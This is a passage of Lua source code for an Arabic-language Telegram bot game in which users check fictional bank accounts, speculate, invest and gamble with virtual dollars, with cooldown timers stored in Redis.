if text and text:match('^حساب (.*)$') or text and text:match('^حسابه (.*)$') then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local UserName = text:match('^حساب (.*)$') or text:match('^حسابه (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if Redis:get("boballcc"..coniss) then
local yty = Redis:get("boballname"..coniss)
local bobpkh = Redis:get("boballid"..coniss)
ballancee = Redis:get("boob"..bobpkh) or 0
local convert_mony = string.format("%.0f",ballancee)
local dfhb = Redis:get("boballbalc"..coniss)

local fsvhh = Redis:get("boballban"..coniss)
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم : "..yty.."\n• الحساب : `"..coniss.."`\n• بنك : ( لاريكا )\n• نوع : ( "..fsvhh.." )\n• الرصيد : ( "..convert_mony.." دولار 💰 )","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• لا يوجده حساب بنكي كذا","md",true)
end
end

if text == 'مضاربه' then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
if Redis:ttl("iiooooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 12 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 660 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 11 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`مضاربه` المبلغ","md",true)
end

if text and text:match('^مضاربه (.*)$') or text and text:match('^مضاربة (.*)$') then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local UserName = text:match('^مضاربه (.*)$') or text:match('^مضاربة (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if Redis:sismember("booob",msg.sender.user_id) then
if Redis:ttl("iiooooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 12 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 660 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 11 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iiooooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تضارب الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(coniss) < 99 then
return LuaTele.sendText(msg.chat_id,msg.id, "• الحد الادنى المسموح هو 100 دولار 💰","md",true)
end
if tonumber(ballancee) < tonumber(coniss) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end
local modarba = {"1", "2", "3", "4️",}
local Descriptioontt = modarba[math.random(#modarba)]
local modarbaa = math.random(1,90);
if Descriptioontt == "1" or Descriptioontt == "3" then
ballanceekku = coniss / 100 * modarbaa
ballanceekkku = ballancee - ballanceekku
local convert_mony = string.format("%.0f",ballanceekku)
local convert_mony1 = string.format("%.0f",ballanceekkku)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceekkku))
Redis:setex("iiooooo" .. msg.sender.user_id,900, true)
LuaTele.sendText(msg.chat_id,msg.id, "• مضاربة فاشلة ❎\n• نسبة الخسارة "..modarbaa.."%\n• المبلغ الذي خسرته ( "..convert_mony.." دولار 💰 )\n• فلوسك اصبحت ( "..convert_mony1.." دولار 💰 )","md",true)
elseif Descriptioontt == "2" or Descriptioontt == "4" then
ballanceekku = coniss / 100 * modarbaa
ballanceekkku = ballancee + ballanceekku
local convert_mony = string.format("%.0f",ballanceekku)
local convert_mony1 = string.format("%.0f",ballanceekkku)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceekkku))
Redis:setex("iiooooo" .. msg.sender.user_id,900, true)
LuaTele.sendText(msg.chat_id,msg.id, "• مضاربة ناجحة ✅\n• نسبة الربح "..modarbaa.."%\n• المبلغ الذي ربحته ( "..convert_mony.." دولار 💰 )\n• فلوسك اصبحت ( "..convert_mony1.." دولار 💰 )","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'استثمار' then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
if Redis:ttl("iioooo" .. msg.sender.user_id) >= 1180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 20 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 19 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1060 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 18 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1000 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 17 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 940 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 16 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 12 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 640 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 11 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`استثمار` المبلغ","md",true)
end

if text and text:match('^استثمار (.*)$') then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local UserName = text:match('^استثمار (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if Redis:sismember("booob",msg.sender.user_id) then
if Redis:ttl("iioooo" .. msg.sender.user_id) >= 1180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 20 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 19 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1060 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 18 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 1000 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 17 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 940 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 16 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 12 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 640 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 11 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iioooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تستثمر الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(coniss) < 99 then
return LuaTele.sendText(msg.chat_id,msg.id, "• الحد الادنى المسموح هو 100 دولار 💰","md",true)
end
if tonumber(ballancee) < tonumber(coniss) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end
if tonumber(ballancee) < 100000 then
local hadddd = math.random(10,15);
ballanceekk = coniss / 100 * hadddd
ballanceekkk = ballancee + ballanceekk
local convert_mony = string.format("%.0f",ballanceekk)
local convert_mony1 = string.format("%.0f",ballanceekkk)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceekkk))
Redis:setex("iioooo" .. msg.sender.user_id,1200, true)
LuaTele.sendText(msg.chat_id,msg.id, "• استثمار ناجح 💰\n• نسبة الربح • "..hadddd.."%\n• مبلغ الربح • ( "..convert_mony.." دولار 💰 )\n• فلوسك اصبحت • ( "..convert_mony1.." دولار 💰 )","md",true)
else
local hadddd = math.random(1,9);
ballanceekk = coniss / 100 * hadddd
ballanceekkk = ballancee + ballanceekk
local convert_mony = string.format("%.0f",ballanceekk)
local convert_mony1 = string.format("%.0f",ballanceekkk)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceekkk))
Redis:setex("iioooo" .. msg.sender.user_id,1200, true)
LuaTele.sendText(msg.chat_id,msg.id, "• استثمار ناجح 💰\n• نسبة الربح • "..hadddd.."%\n• مبلغ الربح • ( "..convert_mony.." دولار 💰 )\n• فلوسك اصبحت • ( "..convert_mony1.." دولار 💰 )","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'حظ' then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
if Redis:ttl("iiooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 12 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 640 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 11 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`حظ` المبلغ","md",true)
end

if text and text:match('^حظ (.*)$') then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local UserName = text:match('^حظ (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if Redis:sismember("booob",msg.sender.user_id) then
if Redis:ttl("iiooo" .. msg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 15 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 14 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 13 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 12 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 640 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 11 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 180 then
